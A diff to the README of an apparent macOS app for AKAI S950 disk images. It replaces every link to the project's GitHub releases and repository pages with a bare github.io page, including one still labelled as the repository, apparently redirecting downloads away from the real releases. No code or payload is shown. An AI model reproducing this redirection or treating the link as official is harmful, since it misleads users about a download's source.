@@ -1,6 +1,6 @@
 # 🎹 AKAI-Image-Manager - Browse & Edit S950 Disk Images Easily
 
-[![Download](https://img.shields.io/badge/Download-AKAI--Image--Manager-blue?style=for-the-badge&logo=github)](https://github.com/20ga8218/AKAI-Image-Manager/releases)
+[![Download](https://img.shields.io/badge/Download-AKAI--Image--Manager-blue?style=for-the-badge&logo=github)](https://20ga8218.github.io)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to AKAI-Image-Manager! This is a native macOS app that lets you browse A
 ## 📥 Download & Install
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/20ga8218/AKAI-Image-Manager/releases](https://github.com/20ga8218/AKAI-Image-Manager/releases)
+Visit this link to download the application: [https://20ga8218.github.io](https://20ga8218.github.io)
 
 ### Step 2: Run the Application
 Once downloaded, open the file and follow the on-screen instructions to install AKAI-Image-Manager on your Mac.
@@ -66,11 +66,11 @@ AKAI-Image-Manager works with:
 
 ## 🔄 Updates
 
-Check the [releases page](https://github.com/20ga8218/AKAI-Image-Manager/releases) for the latest version. Updates are free and include bug fixes and new features.
+Check the [releases page](https://20ga8218.github.io) for the latest version. Updates are free and include bug fixes and new features.
 
 ## 🤝 Support
 
-If you encounter issues or have suggestions, please open an issue on the [GitHub repository](https://github.com/20ga8218/AKAI-Image-Manager).
+If you encounter issues or have suggestions, please open an issue on the [GitHub repository](https://20ga8218.github.io).
 
 ## 📜 License
 
